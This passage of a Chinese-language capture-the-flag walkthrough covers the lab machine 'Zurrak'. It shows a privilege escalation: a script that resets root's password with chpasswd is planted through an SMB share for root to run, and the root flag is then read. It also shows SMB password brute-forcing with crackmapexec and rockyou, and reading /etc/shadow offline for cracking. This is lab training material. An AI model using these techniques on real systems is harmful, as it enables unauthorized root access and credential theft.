+drwxr-xr-x 4 root      root 4096 Oct 20 16:36 ..
+(remote) postgres@zurrak:/opt/internal$ smbclient //127.0.0.1/internal -U 'emre'
+Password for [ZURRAK.HMV\emre]:
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Fri Oct 20 19:02:55 2023
+  ..                                  D        0  Fri Oct 20 16:36:51 2023
+
+                9232860 blocks of size 1024. 6040656 blocks available
+smb: \> pwd
+Current directory is \\127.0.0.1\internal\
+smb: \> cd /home/postgres/
+cd \home\postgres\: NT_STATUS_OBJECT_PATH_NOT_FOUND
+smb: \> lcd /home/postgres
+smb: \> ls
+  .                                   D        0  Fri Oct 20 19:02:55 2023
+  ..                                  D        0  Fri Oct 20 16:36:51 2023
+
+                9232860 blocks of size 1024. 6040656 blocks available
+smb: \> ^C
+(remote) postgres@zurrak:/opt/internal$ cd /home/postgres/
+(remote) postgres@zurrak:/home/postgres$ ls -la
+total 20
+drwxr-xr-x 3 postgres postgres 4096 Apr  7 05:31 .
+drwxr-xr-x 3 root     root     4096 Oct 20 19:06 ..
+-rw------- 1 postgres postgres   28 Oct 24 16:47 emergency.sh
+drwx------ 3 postgres postgres 4096 Apr  7 05:31 .gnupg
+-rw-r--r-- 1 postgres postgres   33 Oct 20 20:23 user.txt
+(remote) postgres@zurrak:/home/postgres$ cat emergency.sh 
+echo "root:1234" | chpasswd
+(remote) postgres@zurrak:/home/postgres$ smbclient //127.0.0.1/internal -U 'emre'
+Password for [ZURRAK.HMV\emre]:
+Try "help" to get a list of possible commands.
+smb: \> pwd
+Current directory is \\127.0.0.1\internal\
+smb: \> lcd /home/postgres/
+smb: \> lpwd
+lpwd: command not found
+smb: \> pwd
+Current directory is \\127.0.0.1\internal\
+smb: \> put emergency.sh
+putting file emergency.sh as \emergency.sh (0.4 kb/s) (average 0.4 kb/s)
+smb: \> ^C
+```
+
+等待执行，然后切换用户：
+
+```bash
+(remote) postgres@zurrak:/home/postgres$ su root
+Password: # 1234
+root@zurrak:/home/postgres# cd /root
+root@zurrak:~# ls -la
+total 24
+drwx------  4 root root 4096 Nov 14 04:12 .
+drwxr-xr-x 18 root root 4096 Oct 20 15:22 ..
+-rw-------  1 root root    0 Nov 14 04:12 .bash_history
+lrwxrwxrwx  1 root root    9 Nov 14 04:12 bash_history -> /dev/null
+-rw-------  1 root root   20 Oct 24 13:56 .lesshst
+drwxr-xr-x  3 root root 4096 Nov 14 04:59 .local
+-rw-r--r--  1 root root   33 Oct 20 20:23 root.txt
+drwx------  2 root root 4096 Oct 20 15:21 .ssh
+root@zurrak:~# cat root.txt 
+66fce7650a88ac2afd99d061e1c6a4df
+```
+
+## 额外收获
+
+### 爆破smb密码
+
+在看[绿师傅的wp](https://kerszl.github.io/hacking/walkthrough/Zurrak/)的时候发现了一种爆破登录的方式：
+
+```
+crackmapexec smb 172.20.10.3 -u asli -p /usr/share/wordlists/rockyou.txt
+```
+
+<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202404071800992.png" alt="image-20240407160421176" style="zoom:50%;" />
+
+牛蛙！！！！记住了！
+
+### 使用qemu模拟
+
+看[一国外师傅解析](https://www.youtube.com/watch?v=tmAwz02KP1Y)的时候，出现了使用`qemu`模拟执行，而不用vmware进行操作的方法，在这里记录一下：
+
+```bash
+qemu-system-x86_64 -hda zurrak.old.vmdk -display gtk,show-cursor=on
+# cat (hd0,1)/etc/shadow
+unshadow passwd shadow > hashattack
+```
+
+## 参考
+
+https://kerszl.github.io/hacking/walkthrough/Zurrak/
+
+https://www.youtube.com/watch?v=zzkF42n2UGw
+
+https://www.youtube.com/watch?v=tmAwz02KP1Y
